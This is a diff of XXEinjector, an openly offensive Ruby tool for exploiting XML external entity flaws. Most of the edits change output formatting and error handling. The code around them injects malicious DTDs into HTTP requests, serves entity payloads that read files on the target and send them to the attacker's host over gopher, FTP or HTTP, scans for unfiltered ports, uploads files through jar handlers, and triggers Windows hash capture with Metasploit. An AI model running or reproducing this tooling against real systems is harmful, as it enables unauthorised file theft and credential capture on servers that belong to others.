@@ -217,6 +217,13 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 else
 	puts "XXEinjector by Jakub Pa\u0142aczy\u0144ski"
 	puts ""
+	puts "Enumeration options:"
+	puts "\"y\" - enumerate currect file (default)"
+	puts "\"n\" - skip currect file"
+	puts "\"a\" - enumerate all files in currect directory"
+	puts "\"s\" - skip all files in currect directory"
+	puts "\"q\" - quit"
+	puts ""
 end
 
 # EXECUTION
@@ -235,13 +242,18 @@ end
 if $logger == "n"
 	z = 1
 	loop do
-		break if File.readlines($file)[z].chomp.empty?
-		if File.readlines($file)[z].include?("Host: ")
-			$remote = File.readlines($file)[z].split(" ")[1]
-			if $remote.include?(":")
-				$port = $remote.split(":")[1]
-				$remote = $remote.split(":")[0]
+		begin
+			break if File.readlines($file)[z].chomp.empty?
+			if File.readlines($file)[z].include?("Host: ")
+				$remote = File.readlines($file)[z].split(" ")[1]
+				if $remote.include?(":")
+					$port = $remote.split(":")[1]
+					$remote = $remote.split(":")[0]
+				end
 			end
+		rescue
+			puts "[-] Wrong HTTP file format."
+			exit(1)
 		end
 		z = z + 1
 	end
@@ -251,6 +263,10 @@ if $logger == "n"
 		else
 			$port = 443
 		end	
+	end
+	if $remote == ""
+		puts "[-] Cannot retrieve hostname."
+		exit(1)
 	end
 end
 
@@ -277,14 +293,14 @@ def configreq()
 				$uri = $uri.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 				found = found + 1
 			end
-			puts "DTD injected." if $verbose == "y"
+			#puts "DTD injected." if $verbose == "y"
 		elsif turi.include?("<?xml") && $direct == ""
 			if $xslt == "n"
 				$uri = $uri.sub("?>", "?>" + URI.encode($dtd).gsub("%20", "+"))
 				$uri = $uri.sub(/(\?%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
 				$uri = $uri.sub(/(%3f>)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
 				$uri = $uri.sub(/(%3f%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
-				puts "DTD injected." if $verbose == "y"
+				#puts "DTD injected." if $verbose == "y"
 				found = found + 1
 			else
 				if turi.match(/(\<\?xml)(.*)(&)/i)
@@ -300,7 +316,7 @@ def configreq()
 					$uri = $uri.sub(/(\<%3fxml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 					found = found + 1
 				end
-				puts "DTD injected." if $verbose == "y"
+				#puts "DTD injected." if $verbose == "y"
 			end
 		end
 	end
@@ -332,7 +348,7 @@ def configreq()
 						end
 						found = found + 1
 					end
-					puts "DTD injected." if $verbose == "y"
+					#puts "DTD injected." if $verbose == "y"
 				end
 			end
 			if header.include?("Accept-Encoding") && $direct != ""
@@ -371,7 +387,7 @@ def configreq()
 					end
 					found = found + 1
 				end
-				puts "DTD injected." if $verbose == "y"
+				#puts "DTD injected." if $verbose == "y"
 			elsif tline.include?("XXEINJECT") && $xslt == "y"
 				postfind = 1
 			elsif tline.include?("<?xml") && $xslt == "n" && $direct == ""
@@ -388,7 +404,7 @@ def configreq()
 						postline = postline.sub(/(%3f%3e)/i, '\1' + $dtd)
 						found = found + 1
 				end
-				puts "DTD injected." if $verbose == "y"
+				#puts "DTD injected." if $verbose == "y"
 			elsif tline.include?("<?xml") && $xslt == "y"
 				postfind = 1
 			end
@@ -411,7 +427,7 @@ def configreq()
 			else
 				$post = $post.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 			end
-			puts "DTD injected." if $verbose == "y"
+			#puts "DTD injected." if $verbose == "y"
 			found = found + 1
 		else
 			if $post.match(/(\<\?xml)(.*)(&)/im) || $post.match(/(%3c%3fxml)(.*)(&)/im) || $post.match(/(%3c\?xml)(.*)(&)/im) || $post.match(/(\<%3fxml)(.*)(&)/im)
@@ -427,7 +443,7 @@ def configreq()
 			else
 				$post = $post.sub("XXEINJECT", $xsl.gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 			end
-			puts "DTD injected." if $verbose == "y"
+			#puts "DTD injected." if $verbose == "y"
 			found = found + 1
 		end
 	end
@@ -439,10 +455,10 @@ def configreq()
 
 	# detect injected DTD
 	if found == 0 && $dtdi == "y"
-		puts "Automatic DTD injection was not successful. Please put \"XXEINJECT\" in request file where DTD should be placed or run XXEinjector with --nodtd if DTD was placed manually."
+		puts "[-] Automatic DTD injection was not successful. Please put \"XXEINJECT\" in request file where DTD should be placed or run XXEinjector with --nodtd if DTD was placed manually."
 		exit(1)
 	elsif found > 1
-		puts "Multiple instances of XML found. It may results in false-positives."
+		puts "[-] Multiple instances of XML found. It may results in false-positives."
 	end
 
 	# configuring request
@@ -523,7 +539,7 @@ def sendreq()
 	end
 	
 	if $verbose == "y"
-		puts "Sending request with malicious XML:"
+		puts "[+] Sending request with malicious XML:"
 		if $proto == "http"
 			puts "http://#{$remote}:#{$port}#{$uri}"
 			puts $headers
@@ -538,7 +554,7 @@ def sendreq()
 			puts "\n"
 		end
 	else
-		puts "Sending request with malicious XML."
+		puts "[+] Sending request with malicious XML."
 	end
 
 	$response = ""
@@ -558,7 +574,7 @@ end
 def send2ndreq()
 	
 	if $verbose == "y"
-		puts "Sending second request:"
+		puts "[+] Sending second request:"
 		if $proto == "http"
 			puts "http://#{$remote}:#{$port}#{$securi}"
 			puts $secheaders
@@ -573,7 +589,7 @@ def send2ndreq()
 			puts "\n"
 		end
 	else
-		puts "Sending second request."
+		puts "[+] Sending second request."
 	end
 	
 	$response = ""
@@ -618,12 +634,12 @@ def log(param)
 		end
 		if  $done == 0
 			if $cut == 1
-				puts "Successfully logged file: /#{logpath}"
+				#puts "Successfully logged file: /#{logpath}"
 			else
 				if logpath[-1] == ":"
-					puts "Successfully logged file: #{logpath}/"
+					#puts "Successfully logged file: #{logpath}/"
 				else
-					puts "Successfully logged file: #{logpath}"
+					#puts "Successfully logged file: #{logpath}"
 				end
 			end
 			$done = 1
@@ -638,7 +654,7 @@ def log(param)
 	else
 		log = File.open($output, "a")
 		log.write param
-		puts "Next results:\n#{param}\n" if $logger == "y" || $verbose == "y"
+		puts "#{param}\n" if $logger == "y" || $verbose == "y"
 		print "> " if $logger == "y"
 		log.close
 	end
@@ -662,7 +678,7 @@ def pusharr(param)
 			end
 			logp += param
 			$filenames.push(logp)
-			puts "Path pushed to array: #{logp}" if $verbose == "y"
+			puts "#{logp}"
 		end
 	end
 end
@@ -715,14 +731,16 @@ begin
 		xsltserv = TCPServer.new xslt_port
 	end
 rescue Errno::EADDRINUSE
-	puts "Specified TCP ports already in use."
+	puts "[-] Specified TCP ports already in use."
 	exit(1)
 end
 
 # HTTP for XML serving and data retrival
 Thread.start do
+Thread.current.report_on_exception = false
 loop do
   Thread.start(http.accept) do |client|
+	Thread.current.report_on_exception = false
 	$done = 0
 	$tmppath = $nextpath
 	loop {
@@ -734,16 +752,16 @@ loop do
 		# HTTP XML serving
 		if req.include? "file.dtd"
 
-			puts "Got request for XML:\n#{req}\n" if $verbose == "y"
+			puts "[+] Got request for XML:\n#{req}\n" if $verbose == "y"
 
 			if hashes == "n" && upload == "" && expect == ""
 				if $cut == 1
-					puts "Responding with XML for: /#{enumpath}"
+					puts "[+] Responding with XML for: /#{enumpath}"
 				else
-					puts "Responding with XML for: #{enumpath}"
+					puts "[+] Responding with XML for: #{enumpath}"
 				end
 			else
-				puts "Responding with proper XML."
+				puts "[+] Responding with proper XML."
 			end
 
 			# respond with proper XML
@@ -794,7 +812,7 @@ loop do
 				payload = "<!ENTITY % payl SYSTEM \"#{$rproto}:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'gopher://#{host}:#{gopher_port}/?gopher=%payl;'>\">"
 				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 			end
-			puts "XML payload sent:\n#{payload}\n\n" if $verbose == "y"
+			puts "[+] XML payload sent:\n#{payload}\n\n" if $verbose == "y"
 
 		end
 
@@ -802,7 +820,7 @@ loop do
 		if req.include? "?p="
 			
 			switch = 0
-			puts "Response with file/directory content received:\n" + req + "\nEnumeration unlocked." if $verbose == "y"
+			puts "[+] Response with file/directory content received:\n" + req + "\n" if $verbose == "y"
 			
 			# retrieve p parameter value and respond
 			req = req.sub("GET /?p=", "").split(" ")[0]
@@ -815,7 +833,7 @@ loop do
 
 			# if PHP expect then print and exit
 			if expect != ""
-				puts "Result of \"#{expect}\" command:\n" + req
+				puts "[+] Result of \"#{expect}\" command:\n" + req
 				exit(1)
 			end
 
@@ -823,6 +841,7 @@ loop do
 			splitter = "%0A"
 			splitter = "\n" if phpfilter == "y"
 
+			puts "[+] Retrieved data:"
 			req.split(splitter).each do |param|
 
 				param = URI.decode(param)
@@ -834,6 +853,7 @@ loop do
 				pusharr(param)
 			end
 		end
+		
 		client.close
 	}
   end
@@ -843,11 +863,13 @@ end
 # FTP server to read files/directory listings and log to files
 if enum == "ftp"
 	Thread.start do
+	Thread.current.report_on_exception = false
 	loop do
   	  Thread.start(ftp.accept) do |client|
+		Thread.current.report_on_exception = false
 		$done = 0
 		switch = 0
-		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
+		#puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
 		$tmppath = $nextpath
 		client.puts("220 XXEinjector Welcomes!")
 		begin
@@ -883,7 +905,7 @@ if enum == "ftp"
 	
 				# if PHP expect then print and exit
 				if expect != ""
-					puts "Result of \"#{expect}\" command:\n" + req
+					puts "[+] Result of \"#{expect}\" command:\n" + req
 					exit(1)
 				end
 				
@@ -912,11 +934,13 @@ end
 # gopher server to read files/directory listings and log to files
 if enum == "gopher"
 	Thread.start do
+	Thread.current.report_on_exception = false
 	loop do
  	  Thread.start(gopher.accept) do |client|
+		Thread.current.report_on_exception = false
 		$done = 0
 		switch = 0
-		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
+		#puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
 		$tmppath = $nextpath
 		begin
 		status = Timeout::timeout($contimeout) {
@@ -929,6 +953,7 @@ if enum == "gopher"
 				end
 	
 				req.sub! 'gopher=', ''
+				puts "[+] Retrieved data:"
 				req.split("\n").each do |param|
 	
 					# logging to file
@@ -950,8 +975,8 @@ end
 
 # logger
 if $logger == "y"
-	puts "You can now make requests."
-	puts "Enter \"exit\" to quit."
+	puts "[+] You can now make requests."
+	puts "[+] Enter \"exit\" to quit."
 	loop do
 		cmp = Readline.readline("> ", true)
 		exit(1) if cmp.chomp == "exit"
@@ -969,9 +994,11 @@ if enumports != ""
 			$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{j}/success.dtd\">%remote;]>"
 			begin
 				Thread.start do
+				Thread.current.report_on_exception = false
 				loop do
 				  enum = TCPServer.new j
   				  Thread.start(enum.accept) do |client|
+					Thread.current.report_on_exception = false
 					ports += String(j) + ","
 					client.close
 					break
@@ -983,7 +1010,7 @@ if enumports != ""
 				send2ndreq() if $secfile != ""
 				j = j + 1
 			rescue Errno::EADDRINUSE
-				puts "Cannot bind to #{j} port."
+				puts "[-] Cannot bind to #{j} port."
 			end
 		end
 
@@ -994,9 +1021,11 @@ if enumports != ""
 			$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{tcpport}/success.dtd\">%remote;]>"
 			begin
 				Thread.start do
+				Thread.current.report_on_exception = false
 				loop do
 				  enum = TCPServer.new tcpport
   				  Thread.start(enum.accept) do |client|
+					Thread.current.report_on_exception = false
 					ports += String(tcpport) + ","
 					client.close
 					break
@@ -1007,14 +1036,14 @@ if enumports != ""
 				sendreq()
 				send2ndreq() if $secfile != ""
 			rescue Errno::EADDRINUSE
-				puts "Cannot bind to #{tcpport} port."
+				puts "[-] Cannot bind to #{tcpport} port."
 			end
 		end
 	end
 	if ports != ""
-		puts "Unfiltered ports: " + ports[0..-2]
+		puts "[+] Unfiltered ports: " + ports[0..-2]
 	else
-		puts "No unfiltered ports were identified."
+		puts "[-] No unfiltered ports were identified."
 	end
 	exit(1)
 else
@@ -1026,11 +1055,13 @@ end
 # TCP server for uploading files using Java jar
 if upload != ""
 	Thread.start do
+	Thread.current.report_on_exception = false
 	loop do
   	  Thread.start(jar.accept) do |client|
+		Thread.current.report_on_exception = false
 		content = IO.binread(upload)
 		count = 0
-		puts "File uploaded. Check temp directory on remote host for jar_cache*.tmp file. This file is available until connection is closed."
+		puts "[+] File uploaded. Check temp directory on remote host for jar_cache*.tmp file. This file is available until connection is closed."
 		loop do
 			if count == 0
 				client.puts(content)
@@ -1051,9 +1082,11 @@ end
 if $xslt == "y"
 	test = 0
 	Thread.start do
+	Thread.current.report_on_exception = false
 	loop do
   	  Thread.start(xsltserv.accept) do |client|
-		puts "XSLT injection is working!"
+		Thread.current.report_on_exception = false
+		puts "[+] XSLT injection is working!"
 		client.close
 		exit(1)
 	  end		
@@ -1062,18 +1095,18 @@ if $xslt == "y"
 	sendreq()
 	send2ndreq() if $secfile != ""
 	sleep timeout
-	puts "XSLT is not working."
+	puts "[-] XSLT is not working."
 	exit(1)
 end
 
 # Retriving Windows hashes
 if hashes == "y"
-	puts "Start msfconsole with auxiliary/server/capture/smb. Press enter when started."
+	puts "[+] Start msfconsole with auxiliary/server/capture/smb. Press enter when started."
 	Readline.readline("> ", true)
 	sendreq()
 	send2ndreq() if $secfile != ""
 	sleep(10)
-	puts "Check msfconsole for hashes."
+	puts "[+] Check msfconsole for hashes."
 	Readline.readline("> ", true)
 	exit(1)
 end
@@ -1083,7 +1116,7 @@ if $brute == ""
 	if $direct == ""
 		enumpath = $path
 		switch = 1
-		puts "Enumeration locked." if $verbose == "y"
+		#puts "Enumeration locked." if $verbose == "y"
 		sendreq()
 		send2ndreq() if $secfile != ""
 	else
@@ -1093,13 +1126,14 @@ if $brute == ""
 		sendreq()
 		send2ndreq() if $secfile != ""
 		if !$response.body.include?("#{$direct}")
-			puts "Response does not contain unique mark."
+			puts "[-] Response does not contain unique mark."
 			exit(1)
 		else
 			if $response.body.include?("#{$direct}#{$direct}")
-				puts "File/directory could not be retrieved."
+				puts "[-] File/directory could not be retrieved."
 				exit(1)
 			else
+				puts "[+] Retrieved data:"
 				$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				
 					
 					# log to separate file
@@ -1109,7 +1143,7 @@ if $brute == ""
 					param = param.chomp
 					if param.match $regex
 						$filenames.push(param)
-						puts "Path pushed to array: #{param}" if $verbose == "y"
+						puts "#{param}"
 					end
 
 				end
@@ -1122,7 +1156,7 @@ if $brute == ""
 		loop do
 			sleep timeout
 			if switch == 1 && hashes == "n" && upload == ""
-				puts "FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
+				puts "[-] FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
 				cmp = Readline.readline("> ", true)
 				Readline::HISTORY.push
 				break if cmp == "n" || cmp == "N"
@@ -1150,19 +1184,22 @@ loop do
 			if enumall != "y" && !blacklist.include?(check) && !whitelist.include?(check)
 				if $cut == 0
 					if $path[-1] == "/"
-						puts "Enumerate #{$path}#{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
+						puts "\nEnumerate #{$path}#{line}? Y/n/s/a/q"
 					else
-						puts "Enumerate #{$path}/#{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
+						puts "\nEnumerate #{$path}/#{line}? Y/n/s/a/q"
 					end
 				else
 					if $path == ""
-						puts "Enumerate /#{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
+						puts "\nEnumerate /#{line}? Y/n/s/a/q"
 					else
-						puts "Enumerate /#{$path}/#{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
+						puts "\nEnumerate /#{$path}/#{line}? Y/n/s/a/q"
 					end
 				end
 				cmp = Readline.readline("> ", true)
 				Readline::HISTORY.push
+				if cmp == "q" || cmp == "Q"
+					exit(1)
+				end
 				if cmp == "s" || cmp == "S"
 					blacklist.push("#{$path}/#{line}".split("/")[0..-2].join('/'))
 				end
@@ -1178,7 +1215,7 @@ loop do
 			if cmp == "y" || cmp == "Y" || cmp == ""
 				if enumall != "y" && !whitelist.include?(check)
 					switch = 1
-					puts "Enumeration locked." if $verbose == "y"
+					#puts "Enumeration locked." if $verbose == "y"
 				end
 				$nextpath = "#{line}"
 	
@@ -1206,7 +1243,7 @@ loop do
 					loop do
 						sleep timeout
 						if switch == 1
-							puts "FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
+							puts "[-] FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
 							cmp = Readline.readline("> ", true)
 							Readline::HISTORY.push
 							break if cmp == "n" || cmp == "N"
@@ -1217,12 +1254,13 @@ loop do
 					end
 				else
 					if not $response.body.include?("#{$direct}")
-						puts "Response does not contain unique mark."
+						puts "[-] Response does not contain unique mark."
 					else
 						if $response.body.include?("#{$direct}#{$direct}")
-							puts "File/directory could not be retrieved."
+							puts "[-] File/directory could not be retrieved."
 						else
 							$done = 0
+							puts "[+] Retrieved data:"
 							$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				
 
 								# log to separate file
@@ -1239,7 +1277,7 @@ loop do
 			end
 			i = i + 1
 		else
-			puts "Nothing else to do. Exiting."
+			puts "[+] Nothing else to do. Exiting."
 			exit(1)
 		end
 	else
@@ -1282,11 +1320,11 @@ loop do
 
 		if $direct != ""
 			if not $response.body.include?("#{$direct}")
-				puts "Response does not contain unique mark." if $verbose == "y"
+				puts "[-] Response does not contain unique mark." if $verbose == "y"
 			else
 				log = File.open($output, "a")
 				log.write $response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n") + "\n"
-				puts "Bruteforced request logged: #{$directpath}" if $verbose == "y"
+				puts "[+] Bruteforced request logged: #{$directpath}" if $verbose == "y"
 				log.close
 			end
 		end
